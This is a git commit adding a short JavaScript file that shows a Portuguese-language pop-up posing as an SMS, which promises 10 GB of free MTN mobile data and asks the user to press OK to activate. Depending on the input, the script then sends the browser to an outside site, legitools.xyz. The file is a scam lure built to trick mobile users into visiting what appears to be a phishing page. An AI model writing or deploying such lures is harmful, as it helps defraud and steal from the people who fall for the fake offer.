2b91c8cd19350100a4c7277e4e866cb4866eae4d
katemj25 <mbokofficial1@gmail.com>
2025-05-01 23:25:47 -0700

    Create activate-freemtn-data.com.js

---
+++ activate-freemtn-data.com.js
@@ -0,0 +1,5 @@
+var password = '10 GB de dados grátis'
+password=prompt('SMS: Parabéns, seu número é elegível para receber 10 GB de recompensa de dados MTN grátis. Pressione OK para ATIVAR.. ','10 GB de dados grátis');
+if (password != '10 GB de dados grátis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
